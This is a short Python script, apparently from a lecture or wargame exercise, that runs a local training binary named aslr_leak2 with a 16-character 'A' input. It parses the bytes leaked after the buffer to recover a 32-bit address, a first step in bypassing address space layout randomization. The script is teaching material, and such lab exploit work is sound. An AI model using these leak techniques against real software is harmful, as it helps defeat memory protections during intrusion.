#!/usr/bin/python

import pexpect
import struct

def exp(line):
    line = line.strip()
    pos = line.rfind('A')+1
    out = line[pos:pos+4]
    dword = struct.unpack('<I', out)[0]
    print "Leaked from leaky buffer: %02x %02x %02x %02x -> 0x%08x" % \
            (ord(out[0]), ord(out[1]), ord(out[2]), ord(out[3]), dword)
    return 'test'

target = '/levels/lecture/aslr/aslr_leak2'
child = pexpect.spawn(target + " " + "A" * 16)

child.expect('Leaky buffer: .+')
child.sendline(exp(child.after))
child.interact()

